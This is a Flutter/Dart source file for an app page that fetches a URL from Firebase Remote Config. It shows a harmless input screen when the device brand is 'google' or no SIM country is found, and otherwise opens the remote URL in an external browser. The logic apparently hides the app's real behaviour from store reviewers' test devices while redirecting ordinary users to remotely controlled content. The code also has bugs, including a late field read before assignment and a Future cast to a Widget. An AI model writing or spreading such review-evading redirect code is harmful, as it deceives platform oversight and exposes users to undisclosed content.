import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_sim_country_code/flutter_sim_country_code.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'input_page.dart';


Future launch(String url) async {
  SharedPreferences sharedPreferences = await SharedPreferences.getInstance();
  sharedPreferences.setString('key', firebaseRemoteConfig.getString('url'));
  if (await canLaunchUrl(Uri.parse(url))) {
    await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
  } else {
    throw 'Could not launch $url';
  }
}

final FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.instance;

Future<FirebaseRemoteConfig> setupRemoteConfig() async {
  final FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.instance;
  await firebaseRemoteConfig.fetch();
  await firebaseRemoteConfig.activate();
  print(firebaseRemoteConfig.getString("url"));
  return firebaseRemoteConfig;
}

class FirePage extends StatefulWidget {
  const FirePage({Key? key}) : super(key: key);

  @override
  State<FirePage> createState() => _FirePageState();
}

class _FirePageState extends State<FirePage> {

  late final _androidDeviceInfo;
  Future deviceInfo() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidDeviceInfo = await deviceInfo.androidInfo;
    if(!mounted) return;
    setState(() {
      _androidDeviceInfo = androidDeviceInfo.brand == 'google';
    });
  }

  String? _simCard;
  Future initSimCardState() async {
    String? simCard;
    try {
      simCard = await FlutterSimCountryCode.simCountryCode;
    } on PlatformException {
      simCard = 'Failed to get sim country code.';
    }
    if(!mounted) return;
    setState(() {
      _simCard = simCard;
    });
  }

  @override
  void initState() {
    super.initState();
    initSimCardState();
    deviceInfo();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: FutureBuilder<FirebaseRemoteConfig>(
        future: setupRemoteConfig(),
        builder: (BuildContext context, AsyncSnapshot<FirebaseRemoteConfig> snapshot) {
          if (snapshot.hasError) {
            return const Center(child: Text('Error'));
          } if (snapshot.hasData) {
            if (firebaseRemoteConfig.getString('url').isEmpty || _androidDeviceInfo || _simCard!.isEmpty) {
              return InputPage(firebaseRemoteConfig: snapshot.requireData);
            } else {
              return FutureBuilder(
                future: launch(snapshot.requireData.getString('url')),
                builder: (BuildContext context, AsyncSnapshot snapshot) {
                  if(snapshot.hasData) {
                    return launch(snapshot.requireData.getString('url')) as Widget;
                  }
                  return InputPage(firebaseRemoteConfig: firebaseRemoteConfig);
                },
              );
            }
          }
          return const Center(child: CircularProgressIndicator(color: Colors.black));
        },
      ),
    );
  }
}
